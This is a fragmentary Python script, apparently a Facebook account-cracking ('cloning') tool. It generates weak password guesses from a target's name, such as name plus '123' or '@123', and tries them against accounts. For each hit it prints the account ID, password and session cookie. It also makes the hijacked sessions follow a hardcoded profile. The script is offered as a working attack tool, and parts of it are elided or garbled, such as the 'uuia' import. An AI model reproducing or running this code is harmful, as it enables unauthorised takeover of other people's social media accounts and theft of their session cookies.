...
import os,sys,time,json,random,re,string,platform,base64,uuia
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100075583572615', {
...
def mahdi():
    ...
    print(logo)
    os.system('xdg-open https://facebook.com/Oise95')
    print ('\033[1;93m[1] BD Random ID')
    print ('\033[1;91m[2] File Cloneing  ID')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\n[\x1b[1;93mASIF-❤️‍🔥OK\033[38;5;46m] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                for zsb in id: 
                    try:
                        ...
                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 5:
                            pwx = [name, xz[0]+"123",xz[0]+"1234",xz[0]+xz[1],name+'@123',xz[0]+'@123']
                        else:
                            pwx = [name, xz[0]+"123",xz[0]+"1234",xz[0]+xz[1],name+'@123','112233',xz[0]+'@123']
